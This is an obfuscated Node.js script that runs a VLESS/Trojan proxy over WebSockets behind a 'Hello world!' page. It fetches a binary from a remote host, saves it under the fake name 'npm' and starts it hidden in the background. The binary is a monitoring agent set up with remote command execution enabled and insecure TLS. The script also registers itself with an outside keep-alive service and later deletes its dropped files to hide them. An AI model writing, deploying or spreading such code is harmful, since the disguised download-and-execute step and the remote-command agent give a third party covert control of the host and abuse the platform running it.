function _0x16a0(_0x214b06,_0x27332b){_0x214b06=_0x214b06-0x139;const _0x3b09e5=_0x3b09();let _0x16a0d0=_0x3b09e5[_0x214b06];return _0x16a0d0;}const _0x59a4c3=_0x16a0;(function(_0x54c968,_0x2b1a2c){const _0x2fa8a4=_0x16a0,_0x1d0433=_0x54c968();while(!![]){try{const _0x4fc5be=-parseInt(_0x2fa8a4(0x1b0))/0x1+parseInt(_0x2fa8a4(0x157))/0x2+parseInt(_0x2fa8a4(0x187))/0x3+parseInt(_0x2fa8a4(0x153))/0x4*(parseInt(_0x2fa8a4(0x195))/0x5)+parseInt(_0x2fa8a4(0x17b))/0x6+-parseInt(_0x2fa8a4(0x191))/0x7+-parseInt(_0x2fa8a4(0x152))/0x8*(-parseInt(_0x2fa8a4(0x155))/0x9);if(_0x4fc5be===_0x2b1a2c)break;else _0x1d0433['push'](_0x1d0433['shift']());}catch(_0x569642){_0x1d0433['push'](_0x1d0433['shift']());}}}(_0x3b09,0x4635f));const os=require('os'),http=require(_0x59a4c3(0x173)),fs=require('fs'),axios=require(_0x59a4c3(0x14e)),net=require(_0x59a4c3(0x1a6)),path=require(_0x59a4c3(0x13e)),crypto=require('crypto'),{Buffer}=require(_0x59a4c3(0x15a)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x59a4c3(0x188)]['UUID']||'cc0279c3-0fae-4e19-b351-baa2c4b81eab',NEZHA_SERVER=process[_0x59a4c3(0x188)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x59a4c3(0x188)][_0x59a4c3(0x16c)]||'',NEZHA_KEY=process[_0x59a4c3(0x188)][_0x59a4c3(0x193)]||'',DOMAIN=process['env'][_0x59a4c3(0x186)]||_0x59a4c3(0x1a8),AUTO_ACCESS=process[_0x59a4c3(0x188)][_0x59a4c3(0x159)]||!![],WSPATH=process[_0x59a4c3(0x188)][_0x59a4c3(0x13b)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x59a4c3(0x160)]||_0x59a4c3(0x175),NAME=process[_0x59a4c3(0x188)]['NAME']||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x465ae1=_0x59a4c3;try{const _0x2ba665=await axios[_0x465ae1(0x199)](_0x465ae1(0x142)),_0x28e8b9=_0x2ba665[_0x465ae1(0x1a4)];ISP=(_0x28e8b9[_0x465ae1(0x1aa)]+'-'+_0x28e8b9[_0x465ae1(0x171)])[_0x465ae1(0x196)](/ /g,'_');}catch(_0x2806c5){ISP='Unknown';}};GetISP();const httpServer=http[_0x59a4c3(0x166)]((_0x48405b,_0x43a59f)=>{const _0x25ab9f=_0x59a4c3;if(_0x48405b[_0x25ab9f(0x184)]==='/'){const _0x533285=path['join'](__dirname,_0x25ab9f(0x1b1));fs[_0x25ab9f(0x1a0)](_0x533285,_0x25ab9f(0x161),(_0x560f2e,_0x21c8ad)=>{const _0x1db731=_0x25ab9f;if(_0x560f2e){_0x43a59f[_0x1db731(0x1a5)](0xc8,{'Content-Type':_0x1db731(0x1a2)}),_0x43a59f[_0x1db731(0x19f)](_0x1db731(0x17d));return;}_0x43a59f[_0x1db731(0x1a5)](0xc8,{'Content-Type':_0x1db731(0x1a2)}),_0x43a59f[_0x1db731(0x19f)](_0x21c8ad);});return;}else{if(_0x48405b[_0x25ab9f(0x184)]==='/'+SUB_PATH){const _0x42b056=NAME?NAME+'-'+ISP:ISP,_0x2c3d60='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x25ab9f(0x1a9)+DOMAIN+_0x25ab9f(0x151)+WSPATH+'#'+_0x42b056,_0x4f057e='trojan://'+UUID+'@'+DOMAIN+_0x25ab9f(0x158)+DOMAIN+_0x25ab9f(0x1a9)+DOMAIN+_0x25ab9f(0x151)+WSPATH+'#'+_0x42b056,_0x53a1b1=_0x2c3d60+'\x0a'+_0x4f057e,_0x2743ef=Buffer[_0x25ab9f(0x178)](_0x53a1b1)['toString'](_0x25ab9f(0x18e));_0x43a59f[_0x25ab9f(0x1a5)](0xc8,{'Content-Type':_0x25ab9f(0x13a)}),_0x43a59f[_0x25ab9f(0x19f)](_0x2743ef+'\x0a');}else _0x43a59f['writeHead'](0x194,{'Content-Type':_0x25ab9f(0x13a)}),_0x43a59f[_0x25ab9f(0x19f)](_0x25ab9f(0x185));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x59a4c3(0x149),_0x59a4c3(0x18c)];function resolveHost(_0x3591e4){return new Promise((_0x6e291b,_0x7c1c30)=>{const _0x55be69=_0x16a0;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x55be69(0x140)](_0x3591e4)){_0x6e291b(_0x3591e4);return;}let _0x3e00ed=0x0;function _0x3b9fe4(){const _0x49d077=_0x55be69;if(_0x3e00ed>=DNS_SERVERS[_0x49d077(0x1a1)]){_0x7c1c30(new Error(_0x49d077(0x194)+_0x3591e4+_0x49d077(0x19c)));return;}const _0x496067=DNS_SERVERS[_0x3e00ed];_0x3e00ed++;const _0x223b94=_0x49d077(0x189)+encodeURIComponent(_0x3591e4)+_0x49d077(0x156);axios[_0x49d077(0x199)](_0x223b94,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x49d077(0x183)](_0x1d78be=>{const _0x22f054=_0x49d077,_0x1c1881=_0x1d78be[_0x22f054(0x1a4)];if(_0x1c1881[_0x22f054(0x16d)]===0x0&&_0x1c1881[_0x22f054(0x14b)]&&_0x1c1881[_0x22f054(0x14b)][_0x22f054(0x1a1)]>0x0){const _0x37dbef=_0x1c1881['Answer'][_0x22f054(0x15f)](_0x848724=>_0x848724['type']===0x1);if(_0x37dbef){_0x6e291b(_0x37dbef['data']);return;}}_0x3b9fe4();})[_0x49d077(0x180)](_0x3ed764=>{_0x3b9fe4();});}_0x3b9fe4();});}function handleVlessConnection(_0x3e2879,_0x4af717){const _0x487453=_0x59a4c3,[_0x2ee388]=_0x4af717,_0x21f46e=_0x4af717[_0x487453(0x19d)](0x1,0x11);if(!_0x21f46e[_0x487453(0x19a)]((_0x2a818d,_0x2ecc1a)=>_0x2a818d==parseInt(uuid['substr'](_0x2ecc1a*0x2,0x2),0x10)))return![];let _0x45c19e=_0x4af717['slice'](0x11,0x12)[_0x487453(0x148)]()+0x13;const _0x5e3d74=_0x4af717[_0x487453(0x19d)](_0x45c19e,_0x45c19e+=0x2)[_0x487453(0x1ab)](0x0),_0x5143d2=_0x4af717[_0x487453(0x19d)](_0x45c19e,_0x45c19e+=0x1)[_0x487453(0x148)](),_0xc75c6e=_0x5143d2==0x1?_0x4af717[_0x487453(0x19d)](_0x45c19e,_0x45c19e+=0x4)['join']('.'):_0x5143d2==0x2?new TextDecoder()[_0x487453(0x16f)](_0x4af717['slice'](_0x45c19e+0x1,_0x45c19e+=0x1+_0x4af717[_0x487453(0x19d)](_0x45c19e,_0x45c19e+0x1)[_0x487453(0x148)]())):_0x5143d2==0x3?_0x4af717['slice'](_0x45c19e,_0x45c19e+=0x10)[_0x487453(0x16b)]((_0x3cea45,_0x34e7f5,_0x49d602,_0x324b49)=>_0x49d602%0x2?_0x3cea45[_0x487453(0x1ac)](_0x324b49['slice'](_0x49d602-0x1,_0x49d602+0x1)):_0x3cea45,[])[_0x487453(0x1af)](_0x1aca9e=>_0x1aca9e[_0x487453(0x1ab)](0x0)['toString'](0x10))[_0x487453(0x154)](':'):'';_0x3e2879[_0x487453(0x181)](new Uint8Array([_0x2ee388,0x0]));const _0x41e977=createWebSocketStream(_0x3e2879);return resolveHost(_0xc75c6e)[_0x487453(0x183)](_0x530f64=>{const _0x1c5b49=_0x487453;net[_0x1c5b49(0x1ad)]({'host':_0x530f64,'port':_0x5e3d74},function(){const _0x19b9b0=_0x1c5b49;this[_0x19b9b0(0x14d)](_0x4af717[_0x19b9b0(0x19d)](_0x45c19e)),_0x41e977['on'](_0x19b9b0(0x17c),()=>{})[_0x19b9b0(0x169)](this)['on'](_0x19b9b0(0x17c),()=>{})[_0x19b9b0(0x169)](_0x41e977);})['on'](_0x1c5b49(0x17c),()=>{});})['catch'](_0x5119e3=>{const _0x533ec2=_0x487453;net[_0x533ec2(0x1ad)]({'host':_0xc75c6e,'port':_0x5e3d74},function(){const _0x55dd11=_0x533ec2;this[_0x55dd11(0x14d)](_0x4af717[_0x55dd11(0x19d)](_0x45c19e)),_0x41e977['on']('error',()=>{})[_0x55dd11(0x169)](this)['on'](_0x55dd11(0x17c),()=>{})['pipe'](_0x41e977);})['on'](_0x533ec2(0x17c),()=>{});}),!![];}function _0x3b09(){const _0x3204a5=['https://arm64.ssss.nyc.mn/agent','get','every','split','\x20with\x20all\x20DNS\x20servers','slice','utf-8','end','readFile','length','text/html','log','data','writeHead','net','includes','1234.abc.com','&fp=chrome&type=ws&host=','country_code','readUInt16BE','concat','connect','Server\x20is\x20running\x20on\x20port\x20','map','492573ZrjHRg','index.html','aarch64','message','text/plain','WSPATH','true','close','path','false','test','hex','https://api.ip.sb/geoip','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','client_secret:\x20','pop','readUInt8','8.8.4.4','\x20-p\x20','Answer','--tls','write','axios','config.yaml','error:\x20','&path=%2F','8jIyxLe','74884cfVhwH','join','1588698IdaqJa','&type=A','221378NJpvsL',':443?security=tls&sni=','AUTO_ACCESS','buffer','unlink','toString','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','arch','find','SUB_PATH','utf8','substr','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/agent','createServer','/bin/bash','npm\x20is\x20running','pipe','443','reduce','NEZHA_PORT','Status','stream','decode','npm\x20running\x20error:','isp','2087','http','8443','sub','trim','2083','from','digest','sha224','2068584ppcCaq','error','Hello\x20world!','update','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','catch','send','https://','then','url','Not\x20Found\x0a','DOMAIN','1422219PntXfY','env','https://dns.google/resolve?name=','post','once','1.1.1.1','arm64','base64','application/json','https://amd64.ssss.nyc.mn/v1','3329620bNOHmJ','listen','NEZHA_KEY','Failed\x20to\x20resolve\x20','40FPPzWG','replace','setsid\x20nohup\x20./npm\x20-s\x20'];_0x3b09=function(){return _0x3204a5;};return _0x3b09();}function handleTrojanConnection(_0x34dece,_0x2812ea){const _0x28826b=_0x59a4c3;try{if(_0x2812ea[_0x28826b(0x1a1)]<0x3a)return![];const _0x2d0bc5=_0x2812ea[_0x28826b(0x19d)](0x0,0x38)[_0x28826b(0x15c)](),_0xd76003=[UUID];let _0x2263af=null;for(const _0x575552 of _0xd76003){const _0x228e96=crypto['createHash'](_0x28826b(0x17a))[_0x28826b(0x17e)](_0x575552)[_0x28826b(0x179)](_0x28826b(0x141));if(_0x228e96===_0x2d0bc5){_0x2263af=_0x575552;break;}}if(!_0x2263af)return![];let _0x52cbeb=0x38;_0x2812ea[_0x52cbeb]===0xd&&_0x2812ea[_0x52cbeb+0x1]===0xa&&(_0x52cbeb+=0x2);const _0x56041d=_0x2812ea[_0x52cbeb];if(_0x56041d!==0x1)return![];_0x52cbeb+=0x1;const _0x2971ca=_0x2812ea[_0x52cbeb];_0x52cbeb+=0x1;let _0x1eee5a,_0x1aaba7;if(_0x2971ca===0x1)_0x1eee5a=_0x2812ea[_0x28826b(0x19d)](_0x52cbeb,_0x52cbeb+0x4)[_0x28826b(0x154)]('.'),_0x52cbeb+=0x4;else{if(_0x2971ca===0x3){const _0x1387c2=_0x2812ea[_0x52cbeb];_0x52cbeb+=0x1,_0x1eee5a=_0x2812ea[_0x28826b(0x19d)](_0x52cbeb,_0x52cbeb+_0x1387c2)[_0x28826b(0x15c)](),_0x52cbeb+=_0x1387c2;}else{if(_0x2971ca===0x4)_0x1eee5a=_0x2812ea[_0x28826b(0x19d)](_0x52cbeb,_0x52cbeb+0x10)[_0x28826b(0x16b)]((_0x278b96,_0xf2ec4,_0x3eb32c,_0xbb00b1)=>_0x3eb32c%0x2?_0x278b96[_0x28826b(0x1ac)](_0xbb00b1[_0x28826b(0x19d)](_0x3eb32c-0x1,_0x3eb32c+0x1)):_0x278b96,[])[_0x28826b(0x1af)](_0x4763ea=>_0x4763ea['readUInt16BE'](0x0)[_0x28826b(0x15c)](0x10))[_0x28826b(0x154)](':'),_0x52cbeb+=0x10;else return![];}}_0x1aaba7=_0x2812ea[_0x28826b(0x1ab)](_0x52cbeb),_0x52cbeb+=0x2;_0x52cbeb<_0x2812ea['length']&&_0x2812ea[_0x52cbeb]===0xd&&_0x2812ea[_0x52cbeb+0x1]===0xa&&(_0x52cbeb+=0x2);const _0x561124=createWebSocketStream(_0x34dece);return resolveHost(_0x1eee5a)[_0x28826b(0x183)](_0x4924f6=>{const _0x2bc7f4=_0x28826b;net[_0x2bc7f4(0x1ad)]({'host':_0x4924f6,'port':_0x1aaba7},function(){const _0x5bf151=_0x2bc7f4;_0x52cbeb<_0x2812ea[_0x5bf151(0x1a1)]&&this[_0x5bf151(0x14d)](_0x2812ea[_0x5bf151(0x19d)](_0x52cbeb)),_0x561124['on']('error',()=>{})[_0x5bf151(0x169)](this)['on']('error',()=>{})['pipe'](_0x561124);})['on']('error',()=>{});})[_0x28826b(0x180)](_0x321836=>{const _0x5f1be7=_0x28826b;net[_0x5f1be7(0x1ad)]({'host':_0x1eee5a,'port':_0x1aaba7},function(){const _0x28006e=_0x5f1be7;_0x52cbeb<_0x2812ea[_0x28006e(0x1a1)]&&this[_0x28006e(0x14d)](_0x2812ea[_0x28006e(0x19d)](_0x52cbeb)),_0x561124['on'](_0x28006e(0x17c),()=>{})['pipe'](this)['on'](_0x28006e(0x17c),()=>{})['pipe'](_0x561124);})['on']('error',()=>{});}),!![];}catch(_0x4f1045){return![];}}wss['on']('connection',(_0x5aa1be,_0x4ef74c)=>{const _0x1507ec=_0x59a4c3,_0x5e7518=_0x4ef74c[_0x1507ec(0x184)]||'';_0x5aa1be[_0x1507ec(0x18b)](_0x1507ec(0x139),_0x1ce0f0=>{const _0x2daf5c=_0x1507ec;if(_0x1ce0f0[_0x2daf5c(0x1a1)]>0x11&&_0x1ce0f0[0x0]===0x0){const _0x3d0e51=_0x1ce0f0[_0x2daf5c(0x19d)](0x1,0x11),_0x12c99e=_0x3d0e51[_0x2daf5c(0x19a)]((_0x120227,_0x14dafd)=>_0x120227==parseInt(uuid[_0x2daf5c(0x162)](_0x14dafd*0x2,0x2),0x10));if(_0x12c99e){!handleVlessConnection(_0x5aa1be,_0x1ce0f0)&&_0x5aa1be[_0x2daf5c(0x13d)]();return;}}!handleTrojanConnection(_0x5aa1be,_0x1ce0f0)&&_0x5aa1be[_0x2daf5c(0x13d)]();})['on'](_0x1507ec(0x17c),()=>{});});const getDownloadUrl=()=>{const _0xa3962=_0x59a4c3,_0x3385c4=os[_0xa3962(0x15e)]();return _0x3385c4==='arm'||_0x3385c4===_0xa3962(0x18d)||_0x3385c4===_0xa3962(0x1b2)?!NEZHA_PORT?_0xa3962(0x164):_0xa3962(0x198):!NEZHA_PORT?_0xa3962(0x190):_0xa3962(0x165);},downloadFile=async()=>{const _0x3ebb58=_0x59a4c3;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2227dd=getDownloadUrl(),_0xd2d86b=await axios({'method':_0x3ebb58(0x199),'url':_0x2227dd,'responseType':_0x3ebb58(0x16e)}),_0x54eff0=fs['createWriteStream']('npm');return _0xd2d86b[_0x3ebb58(0x1a4)]['pipe'](_0x54eff0),new Promise((_0x12576b,_0xf6a6a)=>{const _0x3e7cbb=_0x3ebb58;_0x54eff0['on']('finish',()=>{const _0x14dffe=_0x16a0;console[_0x14dffe(0x1a3)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x304461=>{if(_0x304461)_0xf6a6a(_0x304461);_0x12576b();});}),_0x54eff0['on'](_0x3e7cbb(0x17c),_0xf6a6a);});}catch(_0x1ed96b){throw _0x1ed96b;}},runnz=async()=>{const _0x83581=_0x59a4c3;try{const _0x32b634=execSync(_0x83581(0x17f),{'encoding':_0x83581(0x19e)});if(_0x32b634[_0x83581(0x176)]()!==''){console[_0x83581(0x1a3)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3bb993){}await downloadFile();let _0x173f3d='',_0x1d68b4=[_0x83581(0x16a),_0x83581(0x174),'2096',_0x83581(0x172),_0x83581(0x177),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4e4744=_0x1d68b4[_0x83581(0x1a7)](NEZHA_PORT)?_0x83581(0x14c):'';_0x173f3d=_0x83581(0x197)+NEZHA_SERVER+':'+NEZHA_PORT+_0x83581(0x14a)+NEZHA_KEY+'\x20'+_0x4e4744+_0x83581(0x143);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1afb25=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x83581(0x19b)](':')[_0x83581(0x147)]():'',_0x6bd8a2=_0x1d68b4[_0x83581(0x1a7)](_0x1afb25)?_0x83581(0x13c):_0x83581(0x13f),_0x36a553=_0x83581(0x146)+NEZHA_KEY+_0x83581(0x144)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x6bd8a2+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x83581(0x14f),_0x36a553);}_0x173f3d=_0x83581(0x145);}else{console[_0x83581(0x1a3)](_0x83581(0x15d));return;}}try{exec(_0x173f3d,{'shell':_0x83581(0x167)},_0x2d5b29=>{const _0x2a9a3c=_0x83581;if(_0x2d5b29)console[_0x2a9a3c(0x17c)](_0x2a9a3c(0x170),_0x2d5b29);else console[_0x2a9a3c(0x1a3)](_0x2a9a3c(0x168));});}catch(_0x48522b){console['error'](_0x83581(0x150)+_0x48522b);}};async function addAccessTask(){const _0x3764d5=_0x59a4c3;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x36b261=_0x3764d5(0x182)+DOMAIN;try{const _0x57f805=await axios[_0x3764d5(0x18a)](_0x3764d5(0x163),{'url':_0x36b261},{'headers':{'Content-Type':_0x3764d5(0x18f)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4c63cc){}}const delFiles=()=>{const _0x1a7a31=_0x59a4c3;fs[_0x1a7a31(0x15b)]('npm',()=>{}),fs[_0x1a7a31(0x15b)]('config.yaml',()=>{});};httpServer[_0x59a4c3(0x192)](PORT,()=>{const _0x49a1a3=_0x59a4c3;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x49a1a3(0x1a3)](_0x49a1a3(0x1ae)+PORT);});
